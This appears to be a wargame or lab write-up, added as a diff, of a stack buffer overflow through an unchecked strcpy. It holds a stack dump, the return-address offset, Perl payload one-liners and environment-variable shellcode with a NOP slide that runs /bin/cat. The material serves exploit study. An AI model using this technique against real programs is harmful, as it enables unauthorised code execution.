@@ -1,0 +1,53 @@
+an unchecked strcpy call occurs at main + 70, writing data to a stack 
+buffer
+
+DDDD as controlled text written to 0xffffd5b0:
+
+0xffffd5a0:	0xffffd5b0	0xffffd81c	0x000000bf	0xf7ea6933
+0xffffd5b0:	0x44444444	0xffffd600	0x000000e0	0x00000000
+0xffffd5c0:	0xf7ffd000	0xf7ffd918	0xffffd5e0	0x08048249
+0xffffd5d0:	0x00000000	0xffffd674	0xf7fc7000	0x0000c287
+0xffffd5e0:	0xffffffff	0x0000002f	0xf7e23dc8	0xf7fd51a8
+0xffffd5f0:	0x00008000	0xf7fc7000	0x00000000	0xf7e2f32a
+0xffffd600:	0x00000002	0x00000000	0xf7e45830	0x0804850b
+0xffffd610:	0x00000002	0xffffd6d4	0xffffd6e0	0x080484e1
+0xffffd620:	0xf7fc73dc	0x080481fc	0x080484c9	0x00000000
+0xffffd630:	0xf7fc7000	0xf7fc7000	0x00000000	0xf7e2f637
+0xffffd640:	0x00000002	0xffffd6d4	0xffffd6e0	0x00000000
+0xffffd650:	0x00000000	0x00000000	0xf7fc7000	0xf7ffdc04
+0xffffd660:	0xf7ffd000	0x00000000	0xf7fc7000	0xf7fc7000
+0xffffd670:	0x00000000	0xeb96aba5	0xd1d1c5b5	0x00000000
+0xffffd680:	0x00000000	0x00000000	0x00000002	0x08048350
+0xffffd690:	0x00000000	0xf7feeff0	0xf7fe9880	0xf7ffd000
+
+main returns to 0xf7e2f637, located at 0xffffd63c, 140 bytes after 
+0xffffd5b0.
+
+$(perl -e 'print "D" x 140 . "AAAA"') writes AAAA over the return address 
+of main.
+
+We'll store our /bin/cat shellcode in an environment variable with a
+generous NOP slide and write eip into the middle of it.
+
+|overwritten|original|
+######################
+| 136 bytes | buffer |
+| AAAAAAAAA |        |
+| AAAAAA... |        |
++-----------+--------+
+|   AAAA    |  ebp   |
++-----------+--------+
+| NOP + 128 | retptr |
++-----------+--------+
++-----------+--------+
+| NOP x 256 | env    |
+| shellcode | EVIL   |
++-----------+--------+
+
+EVIL set with:
+export EVIL=$(perl -e 'print "\x90" x 256 . "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2f\x68\x61\x78\x68\x2f\x74\x6d\x70\x89\xe2\x50\x52\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"')
+
+getenvaddr says EVIL will be at 0xffffd759, so we'll ret to 0xffffd7d9,
+128 bytes past the start of the NOP slide, give or take.
+
+perl -e 'print "A" x 140 . "\xd9\xd7\xff\xff"'
